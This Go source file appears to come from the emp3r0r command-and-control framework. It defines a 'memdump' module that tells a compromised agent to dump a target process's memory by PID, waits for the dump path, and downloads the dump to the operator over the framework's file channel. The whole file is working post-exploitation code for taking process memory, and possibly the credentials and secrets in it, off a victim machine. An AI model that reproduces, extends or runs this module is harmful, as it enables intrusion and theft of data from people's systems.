package modules

import (
	"fmt"
	"strings"
	"time"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

func init() {
	registerModuleRunner(def.ModMemDump, moduleMemDump)
}

func moduleMemDump(ctx *c2context.C2Context) {
	if ctx.Target == nil {
		logging.Errorf("No active agent")
		return
	}
	pidOpt, ok := ctx.Flags["pid"]
	if !ok {
		logging.Errorf("Option 'pid' not found")
		return
	}
	cmd := fmt.Sprintf("%s --pid %s", def.C2CmdMemDump, pidOpt)
	job_id := uuid.NewString()
	err := CmdSender(cmd, job_id, ctx.Target.Tag)
	if err != nil {
		logging.Errorf("ModuleMemDump: %v", err)
		return
	}

	// wait for results
	var path string
	for i := 0; i < 100; i++ {
		time.Sleep(1 * time.Second)
		res, ok := live.CmdResults.Load(job_id) // check if the command has finished
		if ok {
			path = util.SanitizeText(res.(string))
			logging.Successf("ModuleMemDump: %s", path)
			live.CmdResults.Delete(job_id)
			break
		}
	}

	if path == "" || strings.HasPrefix(path, "Error") {
		logging.Errorf("Failed to get memdump file path: %s", path)
		return
	}

	_, err = ftp.GetFile(path, ctx.Target)
	if err != nil {
		logging.Errorf("GetFile: %v", err)
		return
	}
}
